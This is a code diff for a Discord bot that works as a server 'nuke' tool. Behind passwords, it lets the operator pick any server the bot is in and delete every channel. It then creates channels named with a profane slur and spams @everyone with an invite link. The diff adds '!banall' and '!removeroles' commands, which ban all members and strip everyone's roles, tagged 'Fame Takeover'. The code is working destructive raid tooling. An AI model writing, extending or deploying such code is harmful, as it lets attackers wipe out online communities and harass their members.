@@ -40,7 +40,7 @@ client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
 });
 
-// ====================== COMMANDS ======================
+// ====================== MESSAGE COMMANDS ======================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   const content = message.content.trim().toLowerCase();
@@ -61,6 +61,40 @@ client.on('messageCreate', async message => {
 
     return message.reply({ embeds: [embed], components: [row] });
   }
+
+  if (content === '!banall') {
+    const embed = new EmbedBuilder()
+      .setColor('#ff0000')
+      .setTitle('🚫 BAN EVERYONE')
+      .setDescription('This will ban all members (except you and the bot). Password required.')
+      .setFooter({ text: 'Destructive action' });
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`banall_start_${message.author.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Danger)
+    );
+
+    return message.reply({ embeds: [embed], components: [row] });
+  }
+
+  if (content === '!removeroles') {
+    const embed = new EmbedBuilder()
+      .setColor('#ff8800')
+      .setTitle('🗑️ REMOVE ALL ROLES')
+      .setDescription('This will remove all roles from everyone except admins and the bot.')
+      .setFooter({ text: 'Destructive action' });
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`removeroles_start_${message.author.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Danger)
+    );
+
+    return message.reply({ embeds: [embed], components: [row] });
+  }
 });
 
 // ====================== INTERACTIONS ======================
@@ -76,131 +110,183 @@ client.on('interactionCreate', async interaction => {
       return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
     }
 
-    if (action !== 'check') return;
-
-    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
-      const modal = new ModalBuilder()
-        .setCustomId(`check_modal_${interaction.user.id}`)
-        .setTitle('Enter Password');
-      modal.addComponents(new ActionRowBuilder().addComponents(
-        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-      ));
-      return await interaction.showModal(modal);
-    }
-
-    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
-      const password = interaction.fields.getTextInputValue('password');
-      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
-
-      const guilds = Array.from(client.guilds.cache.values());
-      const options = guilds.map(g => ({
-        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
-        value: g.id
-      }));
-
-      const select = new StringSelectMenuBuilder()
-        .setCustomId(`check_server_select_${interaction.user.id}`)
-        .setPlaceholder('Select server')
-        .addOptions(options);
-
-      await interaction.reply({
-        content: '✅ Password accepted. Select server:',
-        components: [new ActionRowBuilder().addComponents(select)],
-        flags: MessageFlags.Ephemeral
-      });
-      userSessions.set(interaction.user.id, {});
-    }
-
-    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
-      await interaction.deferUpdate();
-      const guild = client.guilds.cache.get(interaction.values[0]);
-      userSessions.set(interaction.user.id, { guildId: guild.id });
-
-      const actionSelect = new StringSelectMenuBuilder()
-        .setCustomId(`check_action_select_${interaction.user.id}`)
-        .setPlaceholder('Choose action')
-        .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
-
-      await interaction.editReply({
-        content: `**Selected:** ${guild.name}`,
-        components: [new ActionRowBuilder().addComponents(actionSelect)]
-      });
-    }
-
-    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
-      if (interaction.values[0] === 'nuke') {
+    // ====================== NUKE ======================
+    if (action === 'check') {
+      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
         const modal = new ModalBuilder()
-          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
-          .setTitle('Confirm Nuke');
+          .setCustomId(`check_modal_${interaction.user.id}`)
+          .setTitle('Enter Password');
         modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
+          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
         ));
         return await interaction.showModal(modal);
       }
-    }
 
-    // ==================== MINIMAL NUKE - MAX CHANCE OF WORKING ====================
-    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
-      const password = interaction.fields.getTextInputValue('password');
-      if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
+        const password = interaction.fields.getTextInputValue('password');
+        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
 
-      await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+        const guilds = Array.from(client.guilds.cache.values());
+        const options = guilds.map(g => ({
+          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
+          value: g.id
+        }));
 
-      const session = userSessions.get(interaction.user.id);
-      const guild = client.guilds.cache.get(session?.guildId);
-      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
+        const select = new StringSelectMenuBuilder()
+          .setCustomId(`check_server_select_${interaction.user.id}`)
+          .setPlaceholder('Select server')
+          .addOptions(options);
 
-      const delay = ms => new Promise(r => setTimeout(r, ms));
-      const invite = 'https://discord.gg/veynettas';
-
-      try {
-        await interaction.editReply({ content: `☢️ Deleting all channels...` });
-
-        // Delete
-        for (const ch of guild.channels.cache.values()) {
-          await ch.delete().catch(() => {});
-          await delay(500);
-        }
-
-        // Create channels
-        await interaction.editReply({ content: '🔨 Creating fucked-by-veynetta channels...' });
-
-        let created = 0;
-        for (let i = 0; i < 12; i++) {
-          try {
-            await guild.channels.create({
-              name: 'fucked-by-veynetta',
-              type: 0,
-              reason: 'Fame Nuke'
-            });
-            created++;
-            await delay(800);
-          } catch (e) {
-            console.log("Channel creation stopped");
-            break;
-          }
-        }
-
-        // Spam
-        const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
-        const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
-
-        for (const ch of channels.values()) {
-          for (let i = 0; i < 8; i++) {
-            ch.send(spamText).catch(() => {});
-          }
-        }
-
-        await interaction.editReply({ 
-          content: `✅ **NUKE COMPLETE**\nCreated **${created}** channels named \`fucked-by-veynetta\`` 
+        await interaction.reply({
+          content: '✅ Password accepted. Select server:',
+          components: [new ActionRowBuilder().addComponents(select)],
+          flags: MessageFlags.Ephemeral
         });
-
-      } catch (err) {
-        console.error(err);
-        await interaction.editReply({ content: '❌ Failed. Check bot permissions (needs Administrator).' }).catch(() => {});
+        userSessions.set(interaction.user.id, {});
       }
 
-      userSessions.delete(interaction.user.id);
+      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
+        await interaction.deferUpdate();
+        const guild = client.guilds.cache.get(interaction.values[0]);
+        userSessions.set(interaction.user.id, { guildId: guild.id });
+
+        const actionSelect = new StringSelectMenuBuilder()
+          .setCustomId(`check_action_select_${interaction.user.id}`)
+          .setPlaceholder('Choose action')
+          .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
+
+        await interaction.editReply({
+          content: `**Selected:** ${guild.name}`,
+          components: [new ActionRowBuilder().addComponents(actionSelect)]
+        });
+      }
+
+      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
+        if (interaction.values[0] === 'nuke') {
+          const modal = new ModalBuilder()
+            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
+            .setTitle('Confirm Nuke');
+          modal.addComponents(new ActionRowBuilder().addComponents(
+            new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
+          ));
+          return await interaction.showModal(modal);
+        }
+      }
+
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
+        const password = interaction.fields.getTextInputValue('password');
+        if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
+
+        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+
+        const session = userSessions.get(interaction.user.id);
+        const guild = client.guilds.cache.get(session?.guildId);
+        if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
+
+        const delay = ms => new Promise(r => setTimeout(r, ms));
+        const invite = 'https://discord.gg/veynettas';
+
+        try {
+          await interaction.editReply({ content: `☢️ Nuking **${guild.name}**...` });
+
+          // Delete channels
+          for (const ch of guild.channels.cache.values()) {
+            await ch.delete().catch(() => {});
+            await delay(400);
+          }
+
+          // Create channels
+          for (let i = 0; i < 15; i++) {
+            try {
+              await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
+              await delay(700);
+            } catch {}
+          }
+
+          const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
+          const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
+
+          for (const ch of channels.values()) {
+            for (let i = 0; i < 10; i++) ch.send(spamText).catch(() => {});
+          }
+
+          await interaction.editReply({ content: `✅ Nuke finished on **${guild.name}**. Created \`fucked-by-veynetta\` channels.` });
+        } catch (err) {
+          console.error(err);
+          await interaction.editReply({ content: '⚠️ Nuke partially completed.' }).catch(() => {});
+        }
+
+        userSessions.delete(interaction.user.id);
+      }
+    }
+
+    // ====================== BAN ALL ======================
+    if (action === 'banall') {
+      if (interaction.isButton() && interaction.customId.startsWith('banall_start_')) {
+        const modal = new ModalBuilder()
+          .setCustomId(`banall_modal_${interaction.user.id}`)
+          .setTitle('BAN ALL PASSWORD');
+        modal.addComponents(new ActionRowBuilder().addComponents(
+          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
+        ));
+        return await interaction.showModal(modal);
+      }
+
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('banall_modal_')) {
+        const password = interaction.fields.getTextInputValue('password');
+        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
+
+        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+
+        const guild = interaction.guild;
+        let banned = 0;
+
+        const members = await guild.members.fetch();
+        for (const member of members.values()) {
+          if (member.user.bot || member.id === interaction.user.id || member.id === client.user.id) continue;
+          try {
+            await member.ban({ reason: 'Fame Takeover' });
+            banned++;
+            await new Promise(r => setTimeout(r, 600));
+          } catch {}
+        }
+
+        await interaction.editReply({ content: `✅ Banned **${banned}** members.` });
+      }
+    }
+
+    // ====================== REMOVE ALL ROLES ======================
+    if (action === 'removeroles') {
+      if (interaction.isButton() && interaction.customId.startsWith('removeroles_start_')) {
+        const modal = new ModalBuilder()
+          .setCustomId(`removeroles_modal_${interaction.user.id}`)
+          .setTitle('REMOVE ROLES PASSWORD');
+        modal.addComponents(new ActionRowBuilder().addComponents(
+          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
+        ));
+        return await interaction.showModal(modal);
+      }
+
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('removeroles_modal_')) {
+        const password = interaction.fields.getTextInputValue('password');
+        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
+
+        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+
+        const guild = interaction.guild;
+        let removed = 0;
+
+        const members = await guild.members.fetch();
+        for (const member of members.values()) {
+          if (member.user.bot || member.permissions.has('Administrator')) continue;
+          try {
+            await member.roles.set([]);
+            removed++;
+          } catch {}
+        }
+
+        await interaction.editReply({ content: `✅ Removed roles from **${removed}** members.` });
+      }
     }
 
   } catch (error) {
